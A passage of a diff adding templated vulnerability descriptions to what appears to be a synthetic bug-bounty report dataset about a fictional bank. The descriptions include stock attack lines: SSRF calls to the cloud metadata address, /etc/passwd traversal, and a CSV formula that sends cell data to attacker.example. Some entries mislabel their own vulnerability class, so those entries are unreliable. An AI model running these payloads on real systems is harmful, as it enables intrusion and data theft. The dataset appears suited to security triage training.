+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18002,7 +18139,8 @@
           "offset": "5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18130,7 +18268,8 @@
           "offset": "1d 4h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18265,7 +18404,8 @@
           "offset": "2d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18351,7 +18491,8 @@
           "offset": "3d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18458,7 +18599,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18568,7 +18710,8 @@
           "offset": "7d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18645,7 +18788,8 @@
           "offset": "1d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18775,7 +18919,8 @@
           "offset": "5d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.glaciervaultbank.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18955,7 +19100,8 @@
           "offset": "7d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19074,7 +19220,8 @@
           "offset": "2d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.glaciervaultbank.foo/import`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19194,7 +19341,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19358,7 +19506,8 @@
           "offset": "4d 23h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19472,7 +19621,8 @@
           "offset": "8d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19624,7 +19774,8 @@
           "offset": "4d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19756,7 +19907,8 @@
           "offset": "18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19891,7 +20043,8 @@
           "offset": "7d 13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.glaciervaultbank.foo/export`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20042,7 +20195,8 @@
           "offset": "5d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.glaciervaultbank.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20170,7 +20324,8 @@
           "offset": "5d 5h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.glaciervaultbank.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20254,7 +20409,8 @@
           "offset": "1d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20382,7 +20538,8 @@
           "offset": "4d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.glaciervaultbank.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20513,7 +20670,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.glaciervaultbank.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20626,7 +20784,8 @@
           "offset": "2d 17h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.glaciervaultbank.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20785,7 +20944,8 @@
           "offset": "3d 22h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.glaciervaultbank.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20925,7 +21085,8 @@
           "offset": "1d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/import`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21024,7 +21185,8 @@
           "offset": "2d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://mobile.glaciervaultbank.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21151,7 +21313,8 @@
           "offset": "2d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://banking.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21273,7 +21436,8 @@
           "offset": "7d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://mobile.glaciervaultbank.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21388,7 +21552,8 @@
           "offset": "4d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://mobile.glaciervaultbank.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21536,7 +21701,8 @@
           "offset": "5d 15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://mobile.glaciervaultbank.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21647,7 +21813,8 @@
           "offset": "4d 20h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://banking.glaciervaultbank.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21764,7 +21931,8 @@
           "offset": "4d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
